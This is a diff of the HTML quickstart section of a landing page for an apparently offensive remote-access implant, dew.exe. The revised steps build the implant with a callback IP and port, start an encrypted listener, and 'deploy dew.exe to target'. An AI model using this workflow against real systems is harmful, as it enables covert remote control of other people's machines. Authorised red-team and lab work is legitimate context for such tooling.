@@ -757,7 +757,7 @@
     <span class="section-label">// quickstart</span>
     <h2 class="section-title">Deployed in 30 seconds</h2>
     <p class="section-desc">
-      Generate a key, build the implant, start the listener, deploy. No Docker, no frameworks.
+      One script builds the implant, generates a key, and prints the listener command. No Docker, no frameworks.
     </p>
 
     <div class="start-row">
@@ -770,22 +770,16 @@
         </div>
         <div class="start-body">
           <div class="start-line">
-            <span class="comment"># Generate a shared key</span>
+            <span class="comment"># Build — generates PSK, compiles, prints listener command</span>
           </div>
           <div class="start-line" style="margin-bottom:16px;">
-            <span class="prompt">$</span> <span class="cmd">KEY=</span><span class="arg">$(python3 -c "import secrets; print(secrets.token_hex(32))")</span>
+            <span class="prompt">$</span> <span class="cmd">./build.sh</span> <span class="arg">10.10.14.5</span> <span class="arg">443</span>
           </div>
           <div class="start-line">
-            <span class="comment"># Build the implant</span>
+            <span class="comment"># Start the listener (build.sh prints this with your key)</span>
           </div>
           <div class="start-line" style="margin-bottom:16px;">
-            <span class="prompt">$</span> <span class="cmd">make</span> <span class="flag">LHOST=</span><span class="arg">10.10.14.5</span> <span class="flag">LPORT=</span><span class="arg">443</span> <span class="flag">KEY=</span><span class="arg">$KEY</span>
-          </div>
-          <div class="start-line">
-            <span class="comment"># Start the listener</span>
-          </div>
-          <div class="start-line" style="margin-bottom:16px;">
-            <span class="prompt">$</span> <span class="cmd">python3 listener.py</span> <span class="flag">--lhost</span> <span class="arg">0.0.0.0</span> <span class="flag">--lport</span> <span class="arg">443</span> <span class="flag">--key</span> <span class="arg">$KEY</span>
+            <span class="prompt">$</span> <span class="cmd">python3 listener.py</span> <span class="flag">--lport</span> <span class="arg">443</span> <span class="flag">--key</span> <span class="arg">&lt;key&gt;</span>
           </div>
           <div class="start-line">
             <span class="comment"># Deploy dew.exe to target</span>
@@ -795,7 +789,7 @@
 
       <div class="start-info">
         <p>
-          The Makefile patches callback host, port, and pre-shared key at compile time. One command builds a ready-to-deploy <code>dew.exe</code>.
+          <code>build.sh</code> generates a random 256-bit PSK, cross-compiles <code>dew.exe</code> (~37 KB), and prints the exact listener command with your key. One command.
         </p>
         <p>
           The listener auto-generates a <strong style="color:var(--ctp-text);">self-signed TLS certificate</strong> on first launch. All traffic is encrypted end-to-end: TLS for transport, XChaCha20-Poly1305 for payloads.
